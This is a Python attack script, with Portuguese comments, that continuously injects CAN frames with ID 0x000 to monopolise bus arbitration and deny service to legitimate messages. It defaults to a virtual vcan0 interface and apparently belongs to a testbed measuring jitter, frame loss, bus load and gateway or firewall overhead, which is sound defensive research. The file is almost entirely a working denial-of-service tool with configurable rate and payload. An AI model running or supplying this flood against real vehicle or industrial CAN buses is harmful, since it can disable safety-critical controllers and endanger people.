#!/usr/bin/env python3
"""
Injetar continuamente quadros com ID 0x000 (a maior prioridade possível).
Métricas para a etapa 3:
    - Latência adicional das mensagens legítimas (jitter)
    - Taxa de quadros perdidos (frame drop rate)
    - Utilização do barramento (bus load %)
    - Overhead de CPU no Gateway/Firewall
"""

import argparse
import sys
from pathlib import Path

import can

sys.path.insert(0, str(Path(__file__).resolve().parent))
from lib.attack_runtime import open_socketcan, run_attack_loop, print_report


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Ataque DoS em barramento CAN")
    p.add_argument("--iface", default="vcan0", help="Interface CAN")
    p.add_argument(
        "--id", type=lambda x: int(x, 0), default=0x000, help="ID da mensagem maliciosa"
    )
    p.add_argument(
        "--duration", type=float, default=30.0, help="Duração do ataque em segundos"
    )
    p.add_argument(
        "--rate", type=float, default=0.0, help="Intervalo entre frames em ms"
    )  # 0 = máxima vazão
    p.add_argument(
        "--payload",
        default="FF FF FF FF FF FF FF FF",
        help="Payload em hex separado por espaços (8 bytes)",
    )
    return p.parse_args()


def main() -> None:
    args = parse_args()
    payload = bytes(int(b, 16) for b in args.payload.split())
    bus = open_socketcan(args.iface)
    msg = can.Message(arbitration_id=args.id, data=payload, is_extended_id=False)

    print(
        f"[INFO] Iniciando DoS em {args.iface} | "
        f"ID=0x{args.id:03X} | duração={args.duration}s | "
        f"intervalo={args.rate}ms"
    )

    stats = run_attack_loop(
        args.duration, bus, lambda: msg,
        rate_ms=args.rate, swallow_send_errors=False,
    )
    print_report("DoS", stats)


if __name__ == "__main__":
    main()
